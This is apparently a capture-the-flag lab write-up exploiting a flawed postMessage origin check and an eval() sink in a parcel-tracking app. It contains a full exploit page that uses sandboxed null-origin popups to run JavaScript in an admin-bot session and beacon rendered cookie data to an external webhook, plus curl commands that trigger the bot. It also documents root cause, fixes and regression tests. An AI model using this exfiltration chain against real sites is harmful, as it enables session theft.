# PostOffice Pwnbox Lab - postMessage Null-Origin Bypass + Admin Bot Exfil

Date: 2026-07-08
Target type: CTF/lab
Bug class: postMessage origin validation flaw, sandbox null-origin bypass, eval sink, admin bot abuse, DOM data exfiltration

## Observation

Parcel tracking app at `https://9c350a91cc3e.pwnbox-lab.com/` (earlier instance: `https://aa910fafb2be.pwnbox-lab.com/`).

Initial page hints:

- "Our system processes parcel updates from official branches."
- "Messages from unauthorized sources are rejected."
- `Report Missing Parcel` links to `/report`.
- Static `Session Info` block with `<span id="cookies">No cookies found</span>`.

Vulnerable handler on `/`:

```javascript
window.onmessage = function (event) {
    if (event.origin !== window.origin) {
        document.getElementById('output').innerHTML = "No Hacker!";
        return;
    }

    document.getElementById('output').innerHTML = "received";
    const result = eval(event.data);
};
```

Admin bot flow:

- `POST /report` with `{ "url": "..." }`
- Response: `URL reported - admin will visit shortly`
- External URLs accepted (no same-origin restriction on reported URL)

## Hypothesis

The origin check compares `event.origin` to `window.origin` instead of `location.origin`. A sandboxed browsing context can force both values to the literal string `"null"`, bypassing the check. Because the handler passes attacker-controlled `event.data` to `eval()`, arbitrary JavaScript runs in the victim page context.

The flag is not in `document.cookie` for this lab. The server renders the session cookie into `#cookies` when the request includes a `Cookie` header:

```bash
curl -sS "https://9c350a91cc3e.pwnbox-lab.com/" -H "Cookie: FLAG=pwnbox{test}"
```

```html
<span id="cookies">FLAG=pwnbox{test}</span>
```

Therefore the exfil payload must read `document.getElementById('cookies').innerText`, not `document.cookie`.

## Failed Assumptions

1. **`document.cookie` exfil** — wrong sink; unprivileged sessions show empty cookies and admin flag is rendered server-side into `#cookies`.
2. **Popup-only first attempt without `disable-popup-blocking`** — headless Chrome blocked `window.open()` from sandboxed `srcdoc` unless popups were allowed and testing environment permitted it.
3. **Nested iframe alone for final exfil** — null-origin bypass and `eval()` worked, but cross-origin sandboxed iframe requests did not include admin cookies, so `#cookies` stayed `No cookies found`.
4. **`document.body.appendChild(f)` inside `srcdoc`** — `document.body` is `null` when the `srcdoc` script runs; must use `(document.body || document.documentElement).appendChild(f)`.
5. **Hosting exploit on webhook.site `default_content`** — response includes `Content-Security-Policy: script-src 'none'`, so exploit JavaScript never executes when hosted there.
6. **Using `fetch()` for exfil from sandboxed victim context** — failed in testing; `(new Image()).src=...` was reliable.

## Working Theory

Use a two-layer sandbox:

1. Outer attacker page creates `iframe.sandbox = 'allow-scripts'` with a `srcdoc` script in a null origin.
2. Inner logic either:
   - **iframe chain (bypass proof):** create `iframe.sandbox='allow-scripts'; iframe.src=TARGET`, wait 10s, `postMessage` into target; or
   - **popup chain (working admin solve):** from `srcdoc`, `open(TARGET)` with `allow-popups`, wait 10s, `postMessage` into popup.

Because both sender and receiver can have `window.origin === "null"`, the flawed check passes and `eval(event.data)` runs.

For admin exfil, the popup variant is required so the target page loads as a top-level navigation with admin cookies and the server renders the flag into `#cookies`.

## Evidence

Origin check accepts same-window messages:

```javascript
window.postMessage("document.getElementById('output').textContent='same-win'", '*');
```

Server-side cookie reflection into `#cookies` confirmed with synthetic cookie header.

Local mock handler test with nested sandbox iframes logged:

```text
eo=null|wo=null -> pass -> eval ran
```

Working exfil webhook received:

```text
c=flag=pwnbox{9bafec7ef30c68491180e32bdb52fa7e}
```

from popup-based exploit after reporting hosted URL to admin bot.

## Minimal Reproduction

### 1. Create exfil webhook

```bash
curl -sS -X POST "https://webhook.site/token"
```

### 2. Host exploit outside webhook.site

Use `localhost.run`, `paste.rs`, or a `data:` URL. Do not host executable exploit HTML on webhook.site because of CSP.

### 3. Working exploit (popup + sandbox + 10s delay)

```html
<!DOCTYPE html>
<html><body><script>
const EXFIL = 'https://webhook.site/[uuid]';
const TARGET = 'https://9c350a91cc3e.pwnbox-lab.com/';
const msg = "(new Image()).src='" + EXFIL + "?c='+encodeURIComponent(document.getElementById('cookies').innerText)";

const outer = document.createElement('iframe');
outer.sandbox = 'allow-scripts allow-popups allow-modals allow-top-navigation';
const inner = [
  '<script>',
  "var w=open('" + TARGET + "');",
  "setTimeout(function(){",
  "if(w)w.postMessage(" + JSON.stringify(msg) + ",'*');",
  "},10000);",
  '</scr','ipt>'
].join('');
outer.srcdoc = inner;
document.body.appendChild(outer);
</script></body></html>
```

### 4. Report exploit URL

```bash
curl -sS -X POST "https://9c350a91cc3e.pwnbox-lab.com/report" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://[exploit-host]/postoffice-solve-popup.html"}'
```

### 5. Wait at least 10 seconds

The payload intentionally delays `postMessage` for 10 seconds so the target page and admin session state are ready.

## Result

Confirmed chain:

```text
Flawed postMessage origin check (window.origin)
-> sandboxed null-origin sender
-> sandbox popup loads target with admin cookies
-> server renders flag into #cookies
-> postMessage + eval()
-> read #cookies innerText
-> Image beacon exfil to webhook
-> admin bot visit via /report
```

Flag:

```text
pwnbox{9bafec7ef30c68491180e32bdb52fa7e}
```

## Why Failed Payloads Failed

| Attempt | Why it failed |
|---|---|
| `document.cookie` exfil | Flag rendered into `#cookies`, not readable from `document.cookie` in this lab |
| Nested iframe only | Origin bypass worked, but admin cookies were not sent in cross-origin sandbox iframe |
| webhook.site hosting | CSP `script-src 'none'` blocks exploit script execution |
| Popup without `allow-popups` | `window.open()` returned null in headless testing |
| `document.body.appendChild` in `srcdoc` | `document.body` was null; script aborted before `setTimeout` |
| `fetch()` exfil | Unreliable from sandboxed/null-origin execution context |

## Why Working Test Worked

- `event.origin` and `window.origin` were both `"null"` in the sandboxed popup flow.
- Popup navigation included admin cookies, so the server rendered the flag into `#cookies`.
- `eval(event.data)` executed attacker JavaScript in the target browsing context.
- `(new Image()).src=...` exfiltrated the DOM text without CORS issues.
- The 10-second delay allowed the admin page and exploit host to finish loading before `postMessage`.

## Root Cause

1. Origin validation used `window.origin` instead of `location.origin`.
2. Message data was passed directly to `eval()`.
3. Sensitive session data was rendered into the DOM (`#cookies`).
4. Admin bot visited attacker-controlled URLs with a privileged cookie.

## Impact

- Theft of admin session/flag material from the tracking page.
- Arbitrary JavaScript execution in victim origin via `postMessage`.
- Potential pivot to other admin-only content if combined with credentialed requests.

## Fix

- Compare `event.origin` against a static allowlist or `location.origin`.
- Never use `eval()` on `postMessage` data.
- Do not render secrets into the DOM.
- Mark sensitive cookies `HttpOnly`.
- Restrict or sandbox admin bots; do not browse untrusted pages with privileged cookies.

## Regression Test

- Reject `postMessage` from `null` origin unless explicitly intended.
- Replace `eval` with safe message handlers.
- Ensure admin/report bots do not execute attacker JavaScript with privileged session state.
- Verify secrets are not present in DOM text or `document.cookie`.

## Report Summary

PostOffice exposed a `postMessage` handler that compared `event.origin` to `window.origin` and executed `event.data` with `eval()`. A sandboxed null-origin sender bypassed the check. The final exploit opened the target in a sandbox popup, waited 10 seconds, postMessaged JavaScript that read `#cookies`, and exfiltrated the rendered flag to an external webhook after reporting the exploit URL to the admin bot.
